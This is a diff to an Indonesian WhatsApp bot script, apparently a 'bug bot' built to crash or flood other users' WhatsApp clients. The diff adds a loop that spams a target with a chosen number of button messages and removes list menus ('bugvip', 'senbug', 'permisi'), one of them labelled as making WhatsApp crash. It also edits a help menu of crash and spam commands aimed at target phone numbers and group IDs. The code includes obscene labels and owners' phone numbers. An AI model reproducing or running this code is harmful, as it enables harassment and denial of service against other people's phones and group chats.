@@ -1190,6 +1190,29 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {
 deploy(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
+case '🌷':{
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (!isRegistered) return replyReg(mess.verif)
+if (args.length == 0) return anjay(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `Hallo Aku haikal`
+for (let i = 0; i < jumlah; i++) {
+await haikal.sendMessage(mm, { 
+text: '', 
+templateButtons: [
+{ callButton: { displayText: `OWNER`, phoneNumber: `6285714170944`}},
+{ callButton: { displayText: `OWNER`, phoneNumber: `6281214281312`}},
+{ urlButton: { displayText: `GROUP HW MODS WA`, url: `https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2`}},
+{ quickReplyButton: { displayText: `MY`, id: `Anjay Menger`}},
+{ quickReplyButton: { displayText: `NAME`, id: `AH SLEBEEW`}},
+{ quickReplyButton: { displayText: `HW MODS WA`, id: `JAGOAN OM?`}},
+]
+ })
+ await sleep(10000* secon)
+}
+}
+break
 //=================================================//
 case 'bugbcimage': case 'bugbcvideo': case 'bugbcaudio': {
 if (isBan) throw sticBanLu(from)
@@ -1498,23 +1521,6 @@ haikal.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: doc })
 }
 break
 //=================================================//
-case 'permisi':
-if (isBan) throw sticBanLu(from)
-if (!isRegistered) return replyReg(mess.verif)
-if (!isCreator) return
-
-touchmebre = [
-{
-title: `🌷 HW MODS WA 🌷 ${buttonvirus} ${buttonvirus}`,
-rows: [
-{title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Hay Kontol`},
-{title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
-]
-}
-]
-haikal.sendListMsg(m.chat, `🌷 HW MODS WA 🌷`, haikal.user.name, `Hay Kak Sc Bot Adia Di List`, `Click Here 🌷`, touchmebre, m)
-break
-//=================================================//
 case 'hu': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
@@ -1625,234 +1631,8 @@ if (!isRegistered) return replyReg(mess.verif)
  }
  break
 //=================================================//
-case 'bugvip':{
-if (!isCreator) return
-if (isBan) throw sticBanLu(from)
-if (!isRegistered) return replyReg(mess.verif)
-let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-listMessage :{
-title: `SILAHKAN PILIH BUG NYA \n\n Name : ${pushname} ${ucapanWaktu}\n Number : ${m.sender.split('@')[0]}\n Status : ${isCreator ? 'Owner' : 'User'}`,
-description: "PILIH DI DALAM LIST",
-buttonText: "CLICK DISINI",
-footerText: "",
-listType: "SINGLE_SELECT",
-sections: [{
-"title": "LOADING",
-"rows": [
-{
-"title": "hu",
-"description": "Sukses ✓",
-"rowId": `${prefix}hu`
-}
-]
-},
-{
-"title": "LOADINGt",
-"rows": [
-{
-"title": "hi",
-"description": "Sukses ✓",
-"rowId": `${prefix}hi`
-}
-]
-},
-{
-"title": "LOADING",
-"rows": [
-{
-"title": "ha",
-"description": "Sukses ✓",
-"rowId": `${prefix}ha`
-}
-]
-},
-{
-"title": "LOADING",
-"rows": [
-{
-"title": "he",
-"description": "Sukses ✓",
-"rowId": `${prefix}he`
-}
-]
-},
-{
-"title": "LOADING",
-"rows": [
-{
-"title": "ba",
-"description": "Sukses ✓",
-"rowId": `${prefix}ba`
-}
-]
-},
-{
-"title": "LOADING",
-"rows": [
-{
-"title": "be",
-"description": "Sukses ✓",
-"rowId": `${prefix}be`
-}
-]
-},
-{
-"title": "LOADING",
-"rows": [
-{
-"title": "Bug Vn",
-"description": "Sukses ✓",
-"rowId": `${prefix}bu`
-}
-]
-},
-{
-"title": "LOADING",
-"rows": [
-{
-"title": "Bug Vn",
-"description": "Sukses ✓",
-"rowId": `${prefix}bi`
-}
-]
-},
-{
-"title": "LOADING",
-"rows": [
-{
-"title": "Bug Vn",
-"description": "Sukses ✓",
-"rowId": `${prefix}ca`
-}
-]
-},
-{
-"title": "LOADING",
-"rows": [
-{
-"title": "Bug Vn",
-"description": "Sukses ✓",
-"rowId": `${prefix}ci`
-}
-]
-},
-{
-"title": "LOADING",
-"rows": [
-{
-"title": "Bug Vn",
-"description": "Sukses ✓",
-"rowId": `${prefix}cu`
-}
-]
-},
-{
-"title": "LOADING",
-"rows": [
-{
-"title": "Bug Vn",
-"description": "Sukses ✓",
-"rowId": `${prefix}co`
-}
-]
-},
-],
-listType: 1
-}
-}), { userJid: m.chat, quoted: doc })
-haikal.relayMessage(m.chat, template.message, { messageId: template.key.id })
-}
-break
 //=================================================//
-case 'senbug':{
-if (!isCreator) return
-if (isBan) throw sticBanLu(from)
-if (!isRegistered) return replyReg(mess.verif)
-let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-listMessage :{
-title: `Silahkan Pilih Bug Yang Anda Inginkan \n\n Name : ${pushname} ${ucapanWaktu}\n Number : ${m.sender.split('@')[0]}\n Status : ${isCreator ? 'Owner' : 'User'}`,
-description: "PERINGATAN!!!",
-buttonText: "CLICK DISINI",
-footerText: "EFFECT INI MEMBUAT WHATSAPP MENJADI CRASH",
-listType: "SINGLE_SELECT",
-sections: [{
-"title": "Menu Bug",
-"rows": [
-{
-"title": "Bug1",
-"description": "Bug Berjenis Quoted Gambar",
-"rowId": `${prefix}bug1`
-}
-]
-},
-{
-"title": "Menu Bug",
-"rows": [
-{
-"title": "Bug2",
-"description": "Bug Berjenis Lokasi",
-"rowId": `${prefix}bug2`
-}
-]
-},
-{
-"title": "Menu Bug",
-"rows": [
-{
-"title": "Bug3",
-"description": "Bug Berjenis Troli",
-"rowId": `${prefix}bug3`
-}
-]
-},
-{
-"title": "Menu Bug",
-"rows": [
-{
-"title": "Bug4",
-"description": "Bug Berjenis Audio",
-"rowId": `${prefix}bug4`
-}
-]
-},
-{
-"title": "Menu Bug",
-"rows": [
-{
-"title": "Bug5",
-"description": "Bug Berjenis Group",
-"rowId": `${prefix}bug5`
-}
-]
-},
-{
-"title": "Menu Bug",
-"rows": [
-{
-"title": "Bug6",
-"description": "Bug Berjenis Contact",
-"rowId": `${prefix}bug6`
-}
-]
-},
-{
-"title": "Menu Bug",
-"rows": [
-{
-"title": "Bug7",
-"description": "Bug Berjenis Dokumen",
-"rowId": `${prefix}bug7`
-}
-]
-}
-],
-listType: 1
-}
-}), { userJid: m.chat, quoted: doc })
-haikal.relayMessage(m.chat, template.message, { messageId: template.key.id })
-}
-break
-//=================================================//
+
 case 'inspect': {
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
@@ -5834,22 +5614,29 @@ caption:  ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 
 *[ 🌷 ] Bugmenu*
 
+🌷( jumlah )
 🔥 628xxx|5|5 ( nomot target )
+
 🔥 1237891xx|5|5 ( id group )
+
 jagoanom [ reply nomor target ]
+
 santetdia 628xxx@s.whatsapp.net|10|10s ( nomor target )
+
 santetgc  1237891xxxx@g.us|10|10s ( id group )
+
 ampas1 628xxx ( nomor target )
+
 ampas2 112674448xxx ( id group )
+
 catalogpc 628xxx@s.whatsapp.net|10|10s ( nomor target )
+
 cataloggc 1237891xxxx@g.us|10|10s ( id group )
 
 Ketik > m.chat di group ( untuk mendapatkan id group)
 
 welcome [ on / off ]
-spam [ Reply Bug For Spam ]
-senbug [ Bug Pilihan ]
-bugvip [ Bug Pilihan ]
+spam [ jumlah ]
 ha [ bugvn ]
 hi [ bugvn ]
 hu [ bugvn ]
@@ -5870,21 +5657,20 @@ bug5 [ bug mentions ]
 bug6 [ bug mentions ]
 bug7 [ bug mentions ]
 poll [ bug vote ]
-gaskal [ Abis Kirim Gaskal Kasih Reactions ]
-bugtag [ Bug Yang Sambil Ngetag ]
+gaskal [ Crash ]
+bugtag [ Bug ngetag ]
 inibug [ Bug Tagall ]
 buttonampas [ Bug Button ]
 hiya [ Bug Document ]
 lokas [ Bug Live Lokasi ]
-permisi [ Bug List ]
 catalog [ Bug Catalog ]
 docu [ document ]
 daca [ document ]
 duc [ document ]
 ducu [ document ]
 troli [ Bug Troli ]
-troli2 [ Bug Troli 2 ]
-troli3 [ Bug Troli Crash ] jumlah
+troli2 [ Bug Troli ]
+troli3 [ jumlah ]
 jadibug1 [ Reply Video Jadi Bug Audio ]
 jadibug2 [ Reply Video Jadi Bug Mp3 ]
 jadibug3 [ Reply Audio Jadi Bug Vn ]
